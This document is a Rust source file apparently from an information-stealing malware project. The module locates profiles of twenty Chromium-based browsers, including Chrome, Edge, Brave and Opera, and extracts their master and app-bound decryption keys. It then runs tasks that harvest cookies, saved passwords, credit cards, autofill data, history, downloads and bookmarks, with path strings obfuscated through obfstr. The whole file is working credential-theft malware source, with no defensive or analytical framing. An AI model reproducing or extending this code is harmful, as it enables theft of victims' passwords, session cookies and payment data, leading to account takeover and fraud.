mod cookies;
mod bookmarks;
mod autofill;
mod passwords;
mod creditcards;
mod downloads;
mod history;

use crate::chromium::autofill::AutoFillTask;
use crate::chromium::bookmarks::BookmarksTask;
use crate::chromium::cookies::CookiesTask;
use crate::chromium::creditcards::CreditCardsTask;
use crate::chromium::downloads::DownloadsTask;
use crate::chromium::history::HistoryTask;
use crate::chromium::passwords::PasswordsTask;
use crate::vec;
use alloc::borrow::ToOwned;
use alloc::string::String;
use alloc::sync::Arc;
use alloc::vec::Vec;
use obfstr::obfstr as s;
use tasks::{composite_task, CompositeTask, Task};
use utils::browsers::chromium::{extract_app_bound_encrypted_key, extract_master_key};
use utils::log_debug;
use utils::path::Path;

pub struct ChromiumTask<'a> {
    tasks: Vec<(ChromiumBasedBrowser<'a>, CompositeTask)>,
}

impl ChromiumTask<'_> {
    pub(crate) fn new() -> Self {
        let all_browsers = get_chromium_browsers();
        let mut tasks = vec![];

        for base_browser in all_browsers {
            let Some(browser) = get_browser(&base_browser) else {
                continue
            };

            let browser = Arc::new(browser);

            tasks.push((
                base_browser,
                composite_task!(
                    CookiesTask::new(browser.clone()),
                    BookmarksTask::new(browser.clone()),
                    AutoFillTask::new(browser.clone()),
                    PasswordsTask::new(browser.clone()),
                    DownloadsTask::new(browser.clone()),
                    CreditCardsTask::new(browser.clone()),
                    HistoryTask::new(browser.clone()),
                )
            ))
        }

        Self {
            tasks
        }
    }
}

fn get_browser(browser: &ChromiumBasedBrowser) -> Option<BrowserData> {
    if !browser.user_data.is_exists() {
        return None;
    }

    let master_key = unsafe { extract_master_key(&browser.user_data) };
    let app_bound_encryption_key = unsafe { extract_app_bound_encrypted_key(&browser.user_data) };
    
    if !browser.has_profiles {
        return Some(BrowserData {
            master_key,
            app_bound_encryption_key,
            profiles: vec![browser.user_data.clone()]
        })
    }

    let mut profiles = vec![];

    for profile in browser.user_data.list_files_filtered(&|path| path.is_dir())? {
        let Some(profile_files) = profile.list_files_filtered(&is_in_profile_folder) else {
            continue
        };

        if profile_files.is_empty() {
            continue;
        }

        profiles.push(profile);
    }

    if profiles.is_empty() {
        None
    } else {
        Some(BrowserData {
            master_key,
            app_bound_encryption_key,
            profiles
        })
    }
}

fn is_in_profile_folder(path: &Path) -> bool {
    path.fullname()
        .map(|name| name.ends_with("Profile.ico") || name.ends_with("LOG"))
        .unwrap_or(false)
}

impl Task for ChromiumTask<'_> {
    unsafe fn run(&self, parent: &Path) {
        for (browser, task) in &self.tasks {
            let parent = parent / browser.name;
            unsafe { task.run(&parent) }
        }
    }
}

pub(super) struct BrowserData {
    master_key: Option<Vec<u8>>,
    app_bound_encryption_key: Option<Vec<u8>>,
    profiles: Vec<Path>,
}

impl BrowserData {
    pub(super) unsafe fn decrypt_data(&self, buffer: &[u8]) -> Option<String> {
        unsafe {
            utils::browsers::chromium::decrypt_data(
                buffer,
                self.master_key.as_deref(),
                self.app_bound_encryption_key.as_deref()
            )
        }
    }
}

pub(super) struct ChromiumBasedBrowser<'a> {
    name: &'a str,
    has_profiles: bool,
    user_data: Path
}

macro_rules! browser_without_profiles {
    ($name:expr, $path:expr) => {
        ChromiumBasedBrowser { 
            name: $name, 
            has_profiles: false, 
            user_data: $path
        }
    };
}
macro_rules! browser {
    ($name:expr, $path:expr) => {
        ChromiumBasedBrowser { 
            name: $name, 
            has_profiles: true, 
            user_data: $path
        }
    };
}

fn get_chromium_browsers<'a>() -> [ChromiumBasedBrowser<'a>; 20] {
    let local = Path::localappdata();
    let appdata = Path::appdata();
    let user_data = s!("User Data").to_owned();

    [
        browser!("Amingo",                    &local   / s!("Amingo")               / &user_data),
        browser!("Torch",                     &local   / s!("Torch")                / &user_data),
        browser!("Kometa",                    &local   / s!("Kometa")               / &user_data),
        browser!("Orbitum",                   &local   / s!("Orbitum")              / &user_data),
        browser!("Epic Private",              &local   / s!("Epic Privacy Browser") / &user_data),
        browser!("Cent",                      &local   / s!("CentBrowser")          / &user_data),
        browser!("Vivaldi",                   &local   / s!("Vivaldi")              / &user_data),
        browser!("Chromium",                  &local   / s!("Chromium")             / &user_data),
        browser!("Thorium",                   &local   / s!("Thorium")              / &user_data),
        browser_without_profiles!("Opera",    &appdata / s!("Opera Software")       / s!("Opera Stable")),
        browser_without_profiles!("Opera GX", &appdata / s!("Opera Software")       / s!("Opera GX Stable")),
        browser!("7Star",                     &local   / s!("7Star")                / s!("7Star")         / &user_data),
        browser!("Sputnik",                   &local   / s!("Sputnik")              / s!("Sputnik")       / &user_data),
        browser!("Chrome SxS",                &local   / s!("Google")               / s!("Chrome SxS")    / &user_data),
        browser!("Chrome",                    &local   / s!("Google")               / s!("Chrome")        / &user_data),
        browser!("Edge",                      &local   / s!("Microsoft")            / s!("Edge")          / &user_data),
        browser!("Uran",                      &local   / s!("uCozMedia")            / s!("Uran")          / &user_data),
        browser!("Yandex",                    &local   / s!("Yandex")               / s!("YandexBrowser") / &user_data),
        browser!("Brave",                     &local   / s!("BraveSoftware")        / s!("Brave-Browser") / &user_data),
        browser!("Atom",                      &local   / s!("Mail.Ru")              / s!("Atom")          / &user_data),
    ]
}